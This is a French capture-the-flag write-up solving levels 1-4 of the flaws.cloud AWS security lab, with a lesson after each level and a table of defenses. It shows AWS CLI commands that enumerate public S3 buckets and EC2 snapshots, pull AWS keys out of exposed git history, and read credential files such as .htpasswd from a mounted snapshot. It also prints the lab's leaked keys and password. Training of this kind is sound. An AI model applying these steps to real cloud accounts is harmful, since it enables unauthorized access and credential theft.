# Write-up — flaws.cloud : Niveaux 1 à 4

> **flaws.cloud · Scott Piper (summitroute) · Pilier 2 — Cloud Offensif AWS**
> Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · 2026

[![AWS S3](https://img.shields.io/badge/AWS-S3%20Security-orange.svg)](https://aws.amazon.com/s3/)
[![EC2](https://img.shields.io/badge/AWS-EC2%20Snapshots-orange.svg)](https://aws.amazon.com/ec2/)
[![Solved](https://img.shields.io/badge/Levels%201--4-Solved-brightgreen.svg)]()

---

## TL;DR

| Level | Vulnérabilité | Impact |
| --- | --- | --- |
| 1 | Bucket S3 public — aucune auth requise | Lecture de tous les fichiers sans credentials |
| 2 | Bucket accessible à tout compte AWS authentifié | Lecture avec credentials valides quelconques |
| 3 | `.git/` exposé dans S3 — credentials dans l'historique | Accès complet au compte AWS (tous les buckets) |
| 4 | EC2 snapshot public — mot de passe en clair dans script | Authentification au site protégé |

---

## Level 1 — Bucket S3 Public

**Vulnérabilité :** Le bucket `flaws.cloud` est accessible sans aucune authentification.

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request
```

**Résultat :** listing complet du bucket, fichier `secret-dd02c7c.html` visible.

```bash
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html - --no-sign-request
# → "Congrats! You found the secret file!"
```

> Screenshot : [docs/flaws_level1.png](docs/flaws_level1.png)

**Leçon :** Ne jamais laisser un bucket S3 en accès public. Activer "Block Public Access" sur tous les buckets par défaut.

---

## Level 2 — Bucket Accessible aux Comptes AWS Authentifiés

**Vulnérabilité :** Le bucket est restreint aux comptes AWS authentifiés — mais n'importe quel compte AWS suffit.

```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile default
```

**Résultat :** listing complet avec credentials valides, fichier `secret-e4443fc.html` accessible.

> Screenshot : [docs/flaws_level2.png](docs/flaws_level2.png)

**Leçon :** "Authenticated users" dans une ACL S3 = tout utilisateur AWS dans le monde, pas seulement les utilisateurs de ton compte.

---

## Level 3 — .git/ Exposé + Credentials dans l'Historique Git

**Vulnérabilité :** Le bucket contient un dossier `.git/` accessible. Un commit précédent contient des credentials AWS supprimés mais toujours récupérables.

```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --profile default
# → PRE .git/

aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ ./level3 --profile default
cd level3
git log --oneline
# b64c8dc Oops, accidentally added something I shouldn't have
# f52ec03 first commit

git show f52ec03
# +access_key AKIAJ366LIPB4IJKT7SA
# +secret_access_key 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
```

> Screenshot git log : [docs/flaws_level3.png](docs/flaws_level3.png)

**Impact :** Avec ces credentials, accès à tous les buckets du compte flaws.cloud :

```bash
aws s3 ls --profile flaws3
# → flaws.cloud, level2, level3, level4, level5, level6, theend...
```

> Screenshot buckets : [docs/flaws_level3_buckets.png](docs/flaws_level3_buckets.png)

**Leçon :** Supprimer un fichier d'un commit git ne supprime pas son historique. Toujours révoquer les credentials compromis immédiatement — ne jamais juste les supprimer du code.

---

## Level 4 — EC2 Snapshot Public + Credentials en Clair

**Vulnérabilité :** Un snapshot EC2 a été rendu public. Il contient un script avec le mot de passe HTTP Basic Auth en clair.

**Étape 1 — Trouver le snapshot public :**

```bash
aws ec2 describe-snapshots \
  --owner-ids 975426262029 \
  --region us-west-2 \
  --profile default
# → snap-0b49342abd1bdcb89
```

> Screenshot snapshot : [docs/flaws_level4_snapshot.png](docs/flaws_level4_snapshot.png)

**Étape 2 — Monter le snapshot :**

```bash
# Créer un volume depuis le snapshot dans notre compte
aws ec2 create-volume \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --availability-zone us-west-2a \
  --region us-west-2 --profile default

# Lancer EC2 + attacher le volume + SSH
sudo mount /dev/xvdf1 /mnt/flaws
```

**Étape 3 — Trouver le mot de passe :**

```bash
sudo cat /mnt/flaws/etc/nginx/.htpasswd
# flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0  ← hash MD5

sudo cat /mnt/flaws/home/ubuntu/setupNginx.sh
# htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

> Screenshot htpasswd : [docs/flaws_level4_htpasswd.png](docs/flaws_level4_htpasswd.png)
> Screenshot password : [docs/flaws_level4_password.png](docs/flaws_level4_password.png)

**Étape 4 — Accès au site :**

```bash
curl -u flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M \
  http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
# → Level 4 solved
```

> Screenshot résolution : [docs/flaws_level4_solved.png](docs/flaws_level4_solved.png)

**Leçon :** Les snapshots EC2 contiennent une copie exacte du disque — configs, scripts, historique bash, clés SSH. Un snapshot public expose tout le contenu de l'instance.

---

## Défenses Communes

| Risque | Mesure |
| --- | --- |
| Bucket public | Activer "Block Public Access" au niveau compte AWS |
| Credentials dans git | `git-secrets` ou `truffleHog` en pre-commit hook |
| Snapshot public | Vérifier `--no-public` sur tous les snapshots, audit régulier |
| Script avec password en clair | Utiliser AWS Secrets Manager — jamais de secrets dans les scripts |

---

*Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · Dakar, 2026*
